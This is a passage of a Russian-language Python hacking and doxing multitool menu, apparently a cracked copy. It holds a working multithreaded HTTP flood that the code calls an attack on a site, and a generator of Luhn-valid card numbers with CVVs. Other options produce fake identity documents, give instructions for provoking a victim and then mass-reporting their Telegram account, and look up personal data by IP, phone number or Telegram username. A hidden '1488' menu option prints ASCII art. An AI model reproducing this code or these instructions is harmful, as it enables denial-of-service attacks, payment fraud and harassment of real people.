Отправили письмо - следуйте этим же шагам в правильной последовательности. Выйдите из Tor, Linux, а затем из VPN.\n''', pystyle.Colors.white_to_red, interval = 0.005)
            if choice == '19':
                pystyle.Write.Print("\n[?] Выберите режим: ", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("\n\n[?] 1 - проверить часто используемые порты", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("\n\n[?] 2 - проверить указанный порт", pystyle.Colors.white_to_red, interval=0.005)
                mode = pystyle.Write.Input("\n\n[?] Ваш выбор: ", pystyle.Colors.white_to_red, interval=0.005)
                if mode == "1":
                    print()
                    ports = [
                        20,
                        26,
                        28,
                        29,
                        55,
                        53,
                        80,
                        110,
                        443,
                        8080,
                        1111,
                        1388,
                        2222,
                        1020,
                        4040,
                        6035,
                    ]
                    for port in ports:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        result = sock.connect_ex(("127.0.0.1", port))
                        if result == 0:
                            pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.white_to_red, interval=0.005)
                        else:
                            pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.white_to_red, interval=0.005)
                        sock.close()
                        print()
                elif mode == "2":
                    port = pystyle.Write.Input("\n[?] Введите номер порта: ", pystyle.Colors.white_to_red, interval=0.005)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex(("127.0.0.1", int(port)))
                    print()
                    if result == 0:
                        pystyle.Write.Print(f"[+] Порт {port} открыт", pystyle.Colors.white_to_red, interval=0.005)
                    else:
                        pystyle.Write.Print(f"[+] Порт {port} закрыт", pystyle.Colors.white_to_red, interval=0.005)
                    sock.close()
                    print()
                else:
                    pystyle.Write.Print("\n[!] Неизвестный режим", pystyle.Colors.white_to_red, interval=0.005)
                    print()
            if choice == "14":
                fake = faker.Faker(locale="ru_RU")
                gender = pystyle.Write.Input("\n[?] Введите пол (М - мужской, Ж - женский): ", pystyle.Colors.white_to_red, interval=0.005)
                print()
                if gender not in ["М", "Ж"]:
                    gender = random.choice(["М", "Ж"])
                    pystyle.Write.Print(f"[!] Вы ввели неверное значение, будет выбрано случайным образом: {gender}\n\n", pystyle.Colors.white_to_red, interval=0.005)
                if gender == "М":
                    first_name = fake.first_name_male()
                    middle_name = fake.middle_name_male()
                else:
                    first_name = fake.first_name_female()
                    middle_name = fake.middle_name_female()
                last_name = fake.last_name()
                full_name = f"{last_name} {first_name} {middle_name}"
                birthdate = fake.date_of_birth()
                age = fake.random_int(min=18, max=80)
                street_address = fake.street_address()
                city = fake.city()
                region = fake.region()
                postcode = fake.postcode()
                address = f"{street_address}, {city}, {region} {postcode}"
                email = fake.email()
                phone_number = fake.phone_number()
                inn = str(fake.random_number(digits=12, fix_len=True))
                snils = str(fake.random_number(digits=11, fix_len=True))
                passport_num = str(fake.random_number(digits=10, fix_len=True))
                passport_series = fake.random_int(min=1000, max=9999)
                pystyle.Write.Print(f"[+] ФИО: {full_name}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Пол: {gender}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Дата рождения: {birthdate.strftime('%d %B %Y')}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Возраст: {age} лет\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Адрес: {address}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Email: {email}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Телефон: {phone_number}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] ИНН: {inn}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] СНИЛС: {snils}\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print(f"[+] Паспорт серия: {passport_series} номер: {passport_num}\n", pystyle.Colors.white_to_red, interval=0.005)
            if choice == "15":
                start_url = pystyle.Write.Input("[?] Введите ссылку -> ", pystyle.Colors.white_to_red, interval=0.005)
                max_depth = 2
                visited = set()
                def crawl(url, depth=0):
                    if depth > max_depth:
                        return
                    parsed = urllib.parse.urlparse(url)
                    domain = f"{parsed.scheme}://{parsed.netloc}"
                    if url in visited:
                        return
                    try:
                        response = requests.get(url)
                        html = response.text
                        soup = bs4.BeautifulSoup(html, "html.parser")
                    except:
                        return
                    visited.add(url)
                    pystyle.Write.Print("[+] " + url + "\n", pystyle.Colors.white_to_red, interval=0.005)
                    for link in soup.find_all("a"):
                        href = link.get("href")
                        if not href:
                            continue
                        href = href.split("#")[0].rstrip("/")
                        if href.startswith("http"):
                            href_parsed = urllib.parse.urlparse(href)
                            if href_parsed.netloc != parsed.netloc:
                                continue
                        else:
                            href = domain + href
                        crawl(href, depth + 1)
                print()
                crawl(start_url)
            if choice == "16":
                def dos1():
                    try:
                        def generate_user_agent():
                            versions = [
                                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                                "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                            ]
                            version = random.randint(60, 90)
                            year = random.randint(10, 21)
                            month = random.randint(1, 12)
                            user_agent = random.choice(versions).format(version, year, year, month)
                            return user_agent
                        def make_request(url):
                            headers = {
                                'User-Agent': generate_user_agent()
                            }
                            response = requests.get(url, headers=headers)
                            print(f"\n{colorama.Fore.white_to_red}[{colorama.Fore.WHITE}+{colorama.Fore.white_to_red}]{colorama.Fore.MAGENTA} Атака началась, состояние сайта: ", response.status_code)
                        def dos():
                            url = input(f"{colorama.Fore.white_to_red}[{colorama.Fore.WHITE}?{colorama.Fore.white_to_red}]{colorama.Fore.MAGENTA} Введите ссылку : ")
                            power = input(f"{colorama.Fore.white_to_red}[{colorama.Fore.WHITE}?{colorama.Fore.white_to_red}]{colorama.Fore.MAGENTA} Выберите режим (1 - Слабый/2 - Средний/3 - Мощный) : ")
                            if power == "1":
                                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
                                    while True:
                                        executor.submit(make_request, url)
                            elif power == "2":
                                with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
                                    while True:
                                        executor.submit(make_request, url)
                            elif power == "3":
                                with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
                                    while True:
                                        executor.submit(make_request, url)
                            else:
                                print(f"\n{colorama.Fore.white_to_red}[{colorama.Fore.WHITE}!{colorama.Fore.white_to_red}]{colorama.Fore.MAGENTA} Нет такого режима!")
                        dos()
                    except:
                        print(f'\n{colorama.Fore.white_to_red}[{colorama.Fore.WHITE}!{colorama.Fore.white_to_red}]{colorama.Fore.MAGENTA} Произошла ошибка! Проверьте ввод данных!')
                dos1()
            if choice == "17":
                pystyle.Write.Print("\n[?] Выберите страну:\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("[?] 1: Украина\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("[?] 2: Россия\n", pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("[?] 3: Казахстан\n", pystyle.Colors.white_to_red, interval=0.005)        
                country_choice = pystyle.Write.Input("\n[?] Ваш выбор: ", pystyle.Colors.white_to_red, interval=0.005)        

                if country_choice == "1":
                    country = "Украина"
                elif country_choice == "2":
                    country = "Россия"
                elif country_choice == "3":
                    country = "Казахстан"
                else:
                    pystyle.Write.Print("\n[!] Неправильный ввод.\n", pystyle.Colors.white_to_red, interval=0.005)

                def generate_card_number():
                    bin_number = "4"  
                    for _ in range(5):
                        bin_number += str(random.randint(0, 9))

                    account_number = ''.join(str(random.randint(0, 9)) for _ in range(9))
                    card_number = bin_number + account_number
                    checksum = generate_checksum(card_number)
                    card_number += str(checksum)

                    return card_number

                def generate_checksum(card_number):
                    digits = [int(x) for x in card_number]
                    odd_digits = digits[-2::-2]
                    even_digits = digits[-1::-2]
                    checksum = sum(odd_digits)
                    for digit in even_digits:
                        checksum += sum(divmod(digit * 2, 10))
                    return (10 - checksum % 10) % 10

                def generate_expiry_date():
                    month = random.randint(1, 12)
                    year = random.randint(24, 30)  
                    return "{:02d}/{:02d}".format(month, year)

                def generate_cvv():
                    return ''.join(str(random.randint(0, 9)) for _ in range(3))

                def generate_random_card(country):
                    card_number = generate_card_number()
                    expiry_date = generate_expiry_date()
                    cvv = generate_cvv()
                    return {
                        "Страна": country,
                        "Номер карты": card_number,
                        "Срок действия": expiry_date,
                        "CVV": cvv
                    }

                card = generate_random_card(country)
                pystyle.Write.Print("\n[+] Страна: " + card["Страна"], pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("\n[+] Номер карты: " + card["Номер карты"], pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("\n[+] Срок действия: " + card["Срок действия"], pystyle.Colors.white_to_red, interval=0.005)
                pystyle.Write.Print("\n[+] CVV: " + card["CVV"] + "\n", pystyle.Colors.white_to_red, interval=0.005)
            if choice == "18":
                def mac_lookup(mac_address):
                    api_url = f"https://api.macvendors.com/{mac_address}"
                    try:
                        response = requests.get(api_url)
                        if response.status_code == 200:
                            return response.text.strip()
                        else:
                            return f"Error: {response.status_code} - {response.text}"
                    except Exception as e:
                        return f"Error: {str(e)}"
                mac_address = pystyle.Write.Input("[?] Введите Mac-Address -> ", pystyle.Colors.white_to_red, interval = 0.005)  # Replace this with the MAC address you want to lookup
                vendor = mac_lookup(mac_address)
                pystyle.Write.Print(f"Vendor: {vendor}", pystyle.Colors.white_to_red, interval = 0.005)
            if choice == "13":
                pystyle.Write.Print('''\nПровоцируем жертву на угрозы, оски, буллинг и тд. Дальше пишем на почту DMCA@telegram.org. В письме указывем скриншоты булинга, угроз и тд. "Здраствуйте, хочу подать жалобу на (юзер и айди типа).  уважением, пользователь" и все, главное скриншоты - доказательства\n''', pystyle.Colors.white_to_red, interval = 0.005)
            if choice == "1488":
                if platform.system()=='Windows':
                    pystyle.Anime.Fade(pystyle.Center.Center("MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNXK0kxdollcccccccccccloodxO0KNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNK0Oxdollc::::;;;;;;;;;;;;;;;::::clodxkO0XNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWXKOxolc:;;;;;:::::;:::;;::;;;;;::::;::::;;;;::cldkOKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0kdl::;;:;;::::;::;::::::::;;:;:::;;:::::::::::::::;;:cldkKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKkdl::;::::;::;:::;;:::::;;;::;;::::::::::;::::::::::::::::;;::ldOKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMWN0xoc::::;;::::::::::;;;::::::;::::::::;::::::::::::::::::::::;::;::::cokKWMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWNKko:;;::::;::;;::::::::;;::::;;;;;;;;;;;;;;;;;;;::::::;::::::::::::;;:::;;:cokXWMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMWXOoc:;:;;:::::;:::::::::::;;:clloddxkOOOOOOOOOOkkxddolc::;;;::::::::::::;:::;;:::cx0NWMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMWXkl:;;;:::::::;::;:;;:;;:cldxO0KXNWWWMMMMMMMMMMMMMMMWWWNXK0kxol::;:::;:;;:::::;::::;:coOXWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMWKxl::;:::::::::::;::;;:coxOKNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWXKOxoc:;;:;:::::::::::::;:oOXWMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMWXkl::;::;:::::::::;;:cox0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOdl:;::;;:::::::::::;:oONMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMNOl::;::::::::::::;:cokKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0xl:;;;::::::::::::::o0NMMMMMMMMMMMMM\nMMMMMMMMMMMWKo::::::;::::::::::;:o0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWN0dc:::::::::::;::;:cxKWMMMMMMMMMMM\nMMMMMMMMMMNkc:;:::::::::::::::::;:lkXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkl:;::::::::::::::lONMMMMMMMMMM\nMMMMMMMMWKd::::::::::::::::::::;::;:lkXWWWWMMMMMMMMMMMMMWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWNXkl:;:::::::::::::cxXWMMMMMMMM\nMMMMMMMW0l::;::::::::::::::::::;::::;:cc;;dNMMMMMMMMMMMNo,,,,,,;,,,,,,,,,,,,,,,,,,;;;;;;;;;;;;;;;xNXkl:::::::::::::;:dKWMMMMMMM\nMMMMMMNOc;::;::;:::::;::;;:::::::::;:::;,.lXMMMMMMMMMMMK;                                        cNMWKdc::;::;::::::::o0WMMMMMM\nMMMMMNkc;:::;::;::::;:oxo:;:;;::::::::::;;ckXWMMMMMMMMMK;                                        cNMMWNOl::::::::::::::l0WMMMMM\nMMMMNkc;::::::::::;;cxXWNOo:;::;::::::::;;;:lkXWMMMMMMMK;                                        cNMMMMWKd:;:::::::::;::l0WMMMM\nMMMWOc;;:::::;:::;:lONMMMWNOo:::::::::::::;:;:lkXWMMMMMK;                                        cNMMMMMMNxc;:::;::::::;;oKWMMM\nMMW0l;::::::::;:::l0WMMMMMMMKc';:::::;;::;::;:::lkXWMMMK;                                        cNMMMMMMMNkc;:;;:::::;:::dXWMM\nMWXo:;::::::::::;l0WMMMMMMMMX: .';:::::::::::::;;:lkXWMK;              ..........................oWMMMMMMMMNkc;;:::::::::::xNMM\nMNx:::;:::::::;;cOWMMMMMMMMMX:   .';:::::::::::::;::lkXK;             :0XXXXXXXXXXXXXXXXXXXXXXXXXNMMMMMMMMMMNx:;;:::::::::;cOWM\nW0l;:::;:::::;;:kNMMMMMMMMMMX:     .';:::::::::::::;::ld,             cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMXd::::::::::;;:oXM\nNx:::::;:::::;:dXMMMMMMMMMMMX:       .';:::::;::::;::::;,.            cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMW0l;::::;::;::;ckW\n0l;;::;;:::::;c0WMMMMMMMMMMMX:         .';:::::::::::::::;,.          cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNk::::::;:::;;;oX\nx:;:::::;:::::dXMMMMMMMMMMMMX:           .,:;:::::::::::;;:;,.        cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKo;:::::::;::;c0\no::;;:::::::;cOWMMMMMMMMMMMMX:            :ko:;::::::::::;:::;,'.     cNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNx:;:::::::::;:x\nc;::::::::::;oKWMMMMMMMMMMMMX:            ,dd:,;::::::::::::::::;,.   ,dxxxxxxxxxxxxxxxxxxxxkkkkkKWMMMMMMMMMMMMW0c;::::::::;::o\nc;:::::::::;;dNMMMMMMMMMMMMMX:                 .';::::::::::::::::;,.                            lNMMMMMMMMMMMMMKo;::::::::::;l\n:::;:::::::::xWMMMMMMMMMMMMMX:                   .';:::::::::::::;::;,.                          lNMMMMMMMMMMMMMXd;:::::::;::;c\n:;;:::::::::ckWMMMMMMMMMMMMMX:                     .';:::::::::::;;:::;,.                        lNMMMMMMMMMMMMMXd;::::::::::;c\n:;::::::::;;ckWMMMMMMMMMMMMMX:                       .';::::::::::;:::::;,.                      lNMMMMMMMMMMMMMNd;:;:::;::;;;c\n:::::;;::::::kWMMMMMMMMMMMMMX;                         .';::::::::::::::::;,.                    lNMMMMMMMMMMMMMXd;::;:::::;:;c\nc;;:;;::::::;dNMMMMMMMMMMMMMX;                           .';:::;;:::::::::::;,.                  lNMMMMMMMMMMMMMKo;::;:::::::;l\nc;;:;;::::::;oXMMMMMMMMMMMMMWOdddddddddddddddddddddddddc.  .';:::::::::::;::;;;,,co:.            lWMMMMMMMMMMMMW0c;;::::::::::o\no::::::::::;;cOWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;    .';;::::::::;;::::::lkx'            lWMMMMMMMMMMMMWk:;;::;::::;::x\nx:;:::::::::;:xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;       .';:;;::::::::::::::'            lWMMMMMMMMMMMMXo;::;:::::::;cO\n0l;:;:::::;;:;l0WMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;         .';;::::::::::::::;,.          lWMMMMMMMMMMMWkc;::::::::;;;oX\nNd:;;:::::;::;:dNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK,           .';;:::::::::::;::;,.        lWMMMMMMMMMMWKo;;:::::::::;:kN\nW0c;;:::::::::;ckNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMK;             ;l:;::::;::::;::::;,.      lWMMMMMMMMMMNx:;:::;:::::;;oKM\nMNx::::::::::::;l0WMMMMMMMMMMWNNNNNNNNNNNNNNNNNNNNNNNNN0,             lXOo:;::::::::::::::;,.    lWMMMMMMMMMNkc;::::::::::;cOWM\nMWKo:::::::::::::oKWMMMMMMMMNo,,,,,,,,,,,,,,,,,,,,,,,,,'.             lNWNOo:;;:::::::::;:::;,.  lWMMMMMMMMWOc;:::::::::;;:dXMM\nMMWOl;;:::::::::::o0WMMMMMMMX;                                        lWMMMNOo:;::::::::::::::;,'oNMMMMMMMNOc;::;:::::::;;oKWMM\nMMMNkc;:::;:::::;::l0WMMMMMMX;                                        lNMMMMWNOo:;:::;;:::::::::;ckXWMMMMNkc;::;;:::::;::l0WMMM\nMMMMNkc;::::;:::::::cONMMMMMX;                                        lNMMMMMMWNOo:;::::;::::::::;:lkXWWXxc;::;:::::::;;lOWMMMM\nMMMMMNx:;::::::;::;::cdKWMMMX;                                        lNMMMMMMMMWNOo:;::::::::::;::;:lkOo:;:::;:::::;:;cOWMMMMM\nMMMMMMNkc;:::::::::;:::lONMMX;                                        lNMMMMMMMMMMW0;';:::::::::::;:;::::;:::::::;;:::lOWMMMMMM\nMMMMMMMNOl;:;::;;::::::;:d0NXo''''''''''''''''''''''''''''''''''''''''xWMMMMMMMMMMMKc,:c:;::::;:::::::::::::::::;;:::o0WMMMMMMM\nMMMMMMMMW0o:;:::::::::::::cd0XNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNWMMMMMMMMMMMMWNNNXOo:;::;;:::::::::::::::::;;:dXWMMMMMMMM\nMMMMMMMMMWXxc;::::::::::::;:cd0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMN0o:::;;:::::::::::::::::ckNMMMMMMMMMM\nMMMMMMMMMMMW0o::::::::::::::;;:okKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNkl::::::::::::::::;;:dKWMMMMMMMMMMM\nMMMMMMMMMMMMWXkc::;::;::::::;::;:cdOXWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWKkoc:::::::::::::;:;:lONMMMMMMMMMMMMM\nMMMMMMMMMMMMMMWKdc;;::;:::::::::::;:ldkKNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0koc:;:::::::::::::;;:lkXWMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMWKdc:;;::::::::::;;::;:cldkKNWWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0kdl:;;::;;;:::::::::;;:lxKWMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMWKxc:;:::::::;::;::;::::::loxk0KXNWWMMMMMMMMMMMMMMMMMMMWWNXKOkxoc:;;::::;:::::::::::;;:lkKWMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMWKkl:::::;;:;::::::;;:::::;;:cloodxkkOO00000000OOOkkxdolc::;;;::::::::;::::::;::::coOXWMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMWN0dl::;;::;;:::::::::::::::::;;;;;;;:::::::::;;;;;;:::::::::::::::;;:::;::;;:lxKNWMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMWXOdl:;;;::::::::::::::::::::::::::;;:::::::::::::::::::::::::::;;::::::lx0NWMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMWX0xlc:;:::::::::::::::::::::::::;;;:::::::::::::;;::::::::::;;::cok0NWMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOdoc:;;::::::::::;;:::::;;::::;:::::::::::::::::::::;::coxOXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNKOkdlc:::;;::::::::::::::::::::::::::::::::;;::codk0XWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWNX0Oxdolcc:::;;;;;::;::::;;;;;;::::cllodkOKXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\nMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMWWNXKOkxollccc:::;;::::ccclodxk0KXNWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM"),pystyle.Colors.white_to_red,pystyle.Colorate.Vertical)
                else:
                    pystyle.Anime.Fade(pystyle.Center.Center("MMMMMMMMWNKOxdlcc::::::ccldxOKNWMMMMMMMM\nMMMMMWN0xoc::;::ccllllcc::;;:cokKNWMMMMM\nMMMWNOoc:;:coxO0KXXXXXXK0Oxoc:;:cd0NWMMM\nMMW0o:::::o0NWMMMMMMMMMMMMWNKkoc;::dKWMM\nMNkc::::::cokXMMWOlllllllllllcoxo:::lONM\nNkc;:cxko::;:o0NNc            .kXkc:;ckN\nkc::cONWk,';::cdk:    .:ccccccoKMNkc:;cO\nl:;:xNMMk. .,;:::,.   cNMMMMMMMMMMNx:::o\n:;;l0WMMk.  .',;::;'..;dxxxxxxONMMW0l;;c\n::;oXMMMk.     .';:;;;'.      'OMMWKo;;:\n:;;oKMMM0:',,,,,,',;::;;'..   .OMMWKl;;:\nc;:cOWMMWWNNNNNNK: ..';;;:;.  .OMMWkc::l\nd:::oKWMWKKKKKKKO;    ;l:;:;'.'OMWKo:::x\nKo:::dXWO,.......     cKOo::;;:kNKd:::oK\nW0o:;:o0k,............oNWNkc:::col:;:oKW\nMWKd:::coxO00KKK0KKKKKNMMMNKkl:;;;;cxXWM\nMMWNOo:;::ox0XNWWMMMMMMWWNX0xl::::oONMMM\nMMMMWNOdc:;::codxkkkkkkxdoc::::cdONWMMMM\nMMMMMMMWKOdlc::;;;;;;;;;;::clxOXWMMMMMMM\nMMMMMMMMMMWXOxolc::::::clox0XWMMMMMMMMMM"),pystyle.Colors.white_to_red,pystyle.Colorate.Vertical)
            if choice == "20":
                num_agents = pystyle.Write.Input("\n[?] Введите кол-во User-agent -> ", pystyle.Colors.white_to_red, interval = 0.005)
                def generate_user_agents(num_agents):
                    versions = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                    ]
                    for _ in range(num_agents):
                        version = random.randint(60, 90)
                        year = random.randint(10, 21)
                        month = random.randint(1, 12)
                        
                        user_agent = random.choice(versions).format(version, year, year, month)
                        pystyle.Write.Print("\n" + user_agent, pystyle.Colors.white_to_red, interval = 0.005)
                generate_user_agents(int(num_agents))
                print()
            if choice == "21":
                pystyle.Write.Print("\n[+] ДОНАТ -> ему не надо [+] ТГК -> @perehodasorur [+] Инфа: Крякнул  Asoru мой ккнал: @perehodasoru Anubis идёт нахуй теперь проект мой. Ориг создатель скрипта лайтум. @Zenith_Dox пупсик\n", pystyle.Colors.white_to_red, interval = 0.005)
            if choice == "22":
                pystyle.Write.Print("\n[+] СОЗДАТЕЛЬ -> Ориг создатель скрипта Лайтум\nКрякнул  Asoru мой ккнал: @perehodasoru Anubis идёт нахуй теперь проект мой\n", pystyle.Colors.white_to_red, interval = 0.005)
            if choice == "23":
                sure = pystyle.Write.Input("Вы действительно хотите выйти? Y/N -> ", pystyle.Colors.white_to_red, interval = 0.005)
                if sure.lower() == "y" or sure.lower() == "yes" or sure.lower() == "н" or sure.lower() == "нуы" or sure.lower() == "да" or sure.lower() == "lf":
                    sys.exit()
                else:
                    continue
            pystyle.Write.Input("\n[?] Нажмите Enter для продолжения", pystyle.Colors.white_to_red, interval = 0.005)
            Main()
     except Exception as e:
        print("[!] Произошла ошибка ->", e)
def get_ip_info(ip):
    url = f"https://ipinfo.io/{ip}/json"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            print(f"Информация по IP: {ip}")
            print(f"Область: {data.get('region', 'Не указано')}")
            print(f"Город: {data.get('city', 'Не указано')}")
            print(f"Страна: {data.get('country', 'Не указано')}")
            print(f"Провайдер: {data.get('org', 'Не указано')}")
            print(f"Точный геоданные: {data.get('loc', 'Не указано')}")
        else:
            print(f"Ошибка: Не удалось получить данные (статус {response.status_code})")
    except Exception as e:
        print(f"Произошла ошибка: {e}")

def get_public_tg_info(username: str):
    url = f"https://t.me/{username}"
    resp = requests.get(url, headers={"User-Agent": "Mozilla/5.0"})
    if resp.status_code == 404:
        print("❌ Пользователь не найден (404).")
        return

    soup = BeautifulSoup(resp.text, "html.parser")

    title = soup.find("meta", property="og:title")
    full_name = title["content"] if title else "Не указано"

    desc = soup.find("meta", property="og:description") 
    bio = desc["content"] if desc else "Нет биографии"

    has_photo = bool(soup.find("img", class_="tgme_page_photo_image"))

    print(f"[+] Юзернейм: @{username}")
    print(f"[+] Полное имя: {full_name}")
    print(f"[+] Био: {bio}")
    print(f"[+] Фото профиля: {'Есть' if has_photo else 'Отсутствует'}")

def format_result(data: str):
    print(data)

def search_by_htmlweb(phone: str):
    import requests
    url = f"https://htmlweb.ru/geo/api.php?json&telcod={phone}"
    res = requests.get(url, timeout=10)
    data = res.json()

    if '0' in data:
        info = data['0']
        country = data.get("country", {}).get("name", "Не найдено")
        region = data.get("region", {}).get("name", "Не найдено")
        operator = info.get("oper", "Не найдено")
        telcod = info.get("telcod", "Не найдено")
        latitude = info.get("latitude", "Не найдено")
        longitude = info.get("longitude", "Не найдено")
        time_zone = info.get("time_zone", "Не найдено")
        tz = info.get("tz", "Не найдено")
        mobile = "Мобильный" if info.get("mobile", False) else "Стационарный"
        operator_brand = info.get("oper_brand", "Не найдено")
        def_range = info.get("def", "Не найдено")
        country_fullname = data.get("country", {}).get("fullname", "Не найдено")
        country_english = data.get("country", {}).get("english", "Не найдено")
        country_code3 = data.get("country", {}).get("country_code3", "Не найдено")
        country_iso = data.get("country", {}).get("iso", "Не найдено")
        country_telcod = data.get("country", {}).get("telcod", "Не найдено")
        country_location = data.get("country", {}).get("location", "Не найдено")
        country_capital = data.get("country", {}).get("capital", "Не найдено")
        country_mcc = data.get("country", {}).get("mcc", "Не найдено")
        country_lang = data.get("country", {}).get("lang", "Не найдено")
        country_langcod = data.get("country", {}).get("langcod", "Не найдено")
        region_id = data.get("region", {}).get("id", "Не найдено")
        region_okrug = data.get("region", {}).get("okrug", "Не найдено")
        region_autocod = data.get("region", {}).get("autocod", "Не найдено")
        region_capital = data.get("region", {}).get("capital", "Не найдено")
        region_english = data.get("region", {}).get("english", "Не найдено")
        region_iso = data.get("region", {}).get("iso", "Не найдено")

        result = f"""
 ██▓███   ▄▄▄       ██▀███   ▄▄▄      ▓█████▄  ▒█████  ▒██   ██▒
